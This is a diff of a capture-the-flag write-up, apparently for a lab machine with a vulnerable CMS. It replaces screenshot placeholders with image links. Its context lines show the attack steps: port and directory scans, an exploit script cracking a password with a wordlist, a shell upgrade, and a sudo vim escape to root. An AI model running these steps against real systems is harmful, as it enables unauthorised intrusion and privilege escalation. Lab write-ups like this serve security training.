@@ -12,7 +12,7 @@
 nmap -sV <IP>
 ```
 
-[SCREEN01]
+![SCREEN01](https://github.com/user-attachments/assets/52add270-a336-46d6-bd6d-01afb67d8bae)
 
 ### What's the CVE you're using against the application?
 
@@ -24,9 +24,8 @@ nmap -sV <IP>
 gobuster dir -u http://<IP>:80 -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,txt,html,php
 ```
 
-[SCREEN02]
-
-[SCREEN03]
+![SCREEN02](https://github.com/user-attachments/assets/f55fbc6a-353b-4c53-ba90-3d20cb0a5a8f)
+![SCREEN03](https://github.com/user-attachments/assets/45b0d3d3-16f9-4e28-92ae-6a6ade1b1f1b)
 
 ### What's the password?
 
@@ -36,7 +35,7 @@ gobuster dir -u http://<IP>:80 -w /root/Tools/wordlists/dirbuster/directory-list
 python 46635.py -u http://<IP>:80/simple --crack -w /root/Desktop/Tools/wordlists/rockyou.txt
 ```
 
-[SCREEN04]
+![SCREEN04](https://github.com/user-attachments/assets/028ca143-23a5-4e77-9310-2321e768811c)
 
 ### Where can you login with the details obtained
 
@@ -55,7 +54,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 cat user.txt
 ```
 
-[SCREEN05]
+![SCREEN05](https://github.com/user-attachments/assets/080fb884-4fbd-42c5-bb78-d0e88a96af6c)
 
 ### Is there any other user in the home directory? What's its name?
 
@@ -65,7 +64,7 @@ cat user.txt
 ls /home
 ```
 
-[SCREEN06]
+![SCREEN06](https://github.com/user-attachments/assets/6a944ba7-b315-43e0-ae56-016226330f1a)
 
 ### What can you leverage to spawn a privileged shell?
 
@@ -75,7 +74,7 @@ ls /home
 sudo -l
 ```
 
-[SCREEN07]
+![SCREEN07](https://github.com/user-attachments/assets/2ef77377-6154-49c8-8714-90a9e454cdb1)
 
 ### What's the root flag?
 
@@ -86,4 +85,4 @@ sudo vim -c ':!/bin/sh'
 cat root/root.txt
 ```
 
-[SCREEN08]
+![SCREEN08](https://github.com/user-attachments/assets/b8067291-6154-4a78-8d94-a1a0e9a93ace)
